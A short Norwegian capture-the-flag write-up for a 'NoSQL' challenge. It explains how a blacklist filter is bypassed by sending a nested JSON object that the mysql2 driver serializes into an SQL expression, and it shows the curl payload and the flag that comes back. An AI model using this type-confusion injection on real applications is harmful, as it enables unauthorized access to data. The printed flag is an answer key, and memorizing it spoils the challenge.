# NoSQL

Valider flaggene dine med vår flaggsjekker, som har innebygde tiltak mot [SQL Injection](https://portswigger.net/web-security/sql-injection) for å sikre at flaggene er trygge.

https://nosql.ctf.cybertalent.no

----------------------------------------

```js
let input = JSON.stringify(req.body || "").toLowerCase();
if (blacklist.some(k => input.includes(k))) block;
```

Blacklist inkluderer ', men ikke "\
Applikasjonen bruker MySQL med prepared statements, men validerer ikke datatypen på flag.\
Ved å sende et JSON-objekt i stedet for streng, blir parameter-bindingen feilserialisert av mysql2 og tolket som et SQL-uttrykk `(flag = id = 1)`.
```sh
~/1_grunnleggende/1.9_NoSQL $ curl -X POST https://nosql.ctf.cybertalent.no/validate 
                                   -H "Content-Type: application/json" -d "{\"flag\": {\"id\": {\"id\": 1}}}"

{"ok":true,"message":"28696be6f82e96166a2177d976d32cb9 is a valid flag!"}
```

Flagget er 28696be6f82e96166a2177d976d32cb9
